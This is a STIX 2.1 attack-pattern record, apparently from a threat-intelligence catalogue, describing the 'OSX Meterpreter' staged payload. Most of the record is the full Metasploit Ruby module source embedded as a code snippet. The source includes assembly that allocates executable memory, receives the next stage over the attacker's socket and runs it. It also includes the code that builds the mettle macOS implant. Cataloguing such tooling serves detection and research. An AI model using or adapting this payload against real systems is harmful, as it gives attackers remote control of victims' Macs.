{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f125aa13-5784-44b9-ae23-811c33379680",
    "created": "2024-08-14T16:33:19.25089Z",
    "modified": "2024-08-14T16:33:19.250893Z",
    "name": "OSX Meterpreter",
    "description": "Inject the mettle server payload (staged) 'Platform'      => 'osx'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stages/osx/x64/meterpreter.rb",
            "external_id": "meterpreter.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/CylanceVulnResearch/osx_runbin"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/nologic/shellcc"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n  include Msf::Sessions::MeterpreterOptions\n  include Msf::Sessions::MettleConfig\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'OSX Meterpreter',\n      'Description'   => 'Inject the mettle server payload (staged)',\n      'Platform'      => 'osx',\n      'Author'        => [\n        'parchedmind',  # osx_runbin\n        'nologic',      # shellcc\n        'timwr',        # metasploit integration\n        ],\n      'References'    => [\n          [ 'URL', 'https://github.com/CylanceVulnResearch/osx_runbin' ],\n          [ 'URL', 'https://github.com/nologic/shellcc' ]\n        ],\n      'Arch'         => ARCH_X64,\n      'License'      => MSF_LICENSE,\n      'Session'      => Msf::Sessions::Meterpreter_x64_OSX,\n      'Convention'   => 'sockedi',\n      )\n    )\n  end\n\n  def handle_intermediate_stage(conn, payload)\n    stager_file = File.join(Msf::Config.data_directory, \"meterpreter\", \"x64_osx_stage\")\n    data = File.binread(stager_file)\n    macho = Msf::Payload::MachO.new(data)\n    output_data = macho.flatten\n    entry_offset = macho.entrypoint\n\n    midstager_asm = %(\n      push rdi                    ; save sockfd\n      xor rdi, rdi                ; address\n      mov rsi, #{output_data.length}  ; length\n      mov rdx, 0x7                ; PROT_READ | PROT_WRITE | PROT_EXECUTE\n      mov r10, 0x1002             ; MAP_PRIVATE | MAP_ANONYMOUS\n      xor r8, r8                  ; fd\n      xor r9, r9                  ; offset\n      mov eax, 0x20000c5          ; mmap\n      syscall\n\n      mov r12, rax\n\n      mov rdx, rsi                ; length\n      mov rsi, rax                ; address\n      pop rdi                     ; sockfd\n      mov r10, 0x40               ; MSG_WAITALL\n      xor r8, r8                  ; srcaddr\n      xor r9, r9                  ; addrlen\n      mov eax, 0x200001d          ; recvfrom\n      syscall\n\n      push rdi                    ; save sockfd\n      xor rdi, rdi                ; address\n      mov rsi, #{payload.length}  ; length\n      mov rdx, 0x7                ; PROT_READ | PROT_WRITE | PROT_EXECUTE\n      mov r10, 0x1002             ; MAP_PRIVATE | MAP_ANONYMOUS\n      xor r8, r8                  ; fd\n      xor r9, r9                  ; offset\n      mov eax, 0x20000c5          ; mmap\n      syscall\n\n      mov rdx, rsi                ; length\n      mov rsi, rax                ; address\n      pop rdi                     ; sockfd\n      mov r10, 0x40               ; MSG_WAITALL\n      xor r8, r8                  ; srcaddr\n      xor r9, r9                  ; addrlen\n      mov eax, 0x200001d          ; recvfrom\n      syscall\n\n      mov r10, rsi\n\n      ; setup stack?\n      and rsp, -0x10              ; Align\n      add sp, 0x40                ; Add room for initial stack and prog name\n      mov rax, 109                ; prog name \"m\"\n      push 0                      ;\n      mov rcx, rsp                ; save the stack\n      push 0\n      push 0\n      push 0\n      push 0\n      push 0\n      push 0\n      push rdi                    ; ARGV[1] int sockfd\n      push rcx                    ; ARGV[0] char *prog_name\n      mov rax, 2                  ; ARGC\n      push rax\n\n      mov rsi, r12\n      mov r12, #{payload.length}\n\n      mov rax, #{entry_offset}\n      add rsi, rax\n      call rsi\n\n      ; exit\n      mov eax, 0x2000001\n      mov rdi, 0x1\n      syscall\n    )\n    midstager = Metasm::Shellcode.assemble(Metasm::X64.new, midstager_asm).encode_string\n    print_status(\"Transmitting first stager...(#{midstager.length} bytes)\")\n    conn.put(midstager) == midstager.length\n\n    Rex::sleep(0.1)\n    print_status(\"Transmitting second stager...(#{output_data.length} bytes)\")\n    conn.put(output_data) == output_data.length\n  end\n\n  def generate_stage(opts = {})\n    config_opts = {scheme: 'tcp'}.merge(mettle_logging_config(opts))\n    mettle_macho = MetasploitPayloads::Mettle.new('x86_64-apple-darwin',\n      generate_config(opts.merge(config_opts))).to_binary :exec\n    mettle_macho[0] = 'b'\n    mettle_macho\n  end\nend\n"
}